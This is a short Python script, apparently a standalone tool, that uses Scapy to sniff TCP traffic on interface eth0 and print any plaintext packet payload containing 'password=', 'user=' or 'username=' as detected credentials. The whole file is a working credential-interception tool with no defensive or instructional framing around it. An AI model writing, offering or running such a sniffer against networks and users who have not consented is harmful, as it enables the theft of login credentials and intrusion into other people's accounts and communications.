from scapy.all import *

def extract_credentials(packet):
    if packet.haslayer(Raw):
        try:
            payload = packet[Raw].load.decode(errors='ignore').lower()
            
            # Filtering the plaintext
            if "password=" in payload or "user=" in payload or "username=" in payload:
                print(f"[+] Credentials detected: {payload.strip()}")
        except Exception:
            pass

if __name__ == "__main__":
    print("Listening on eth0...")
    
    # capturing the TCP packet
    sniff(iface="eth0", filter="tcp", prn=extract_credentials, store=0)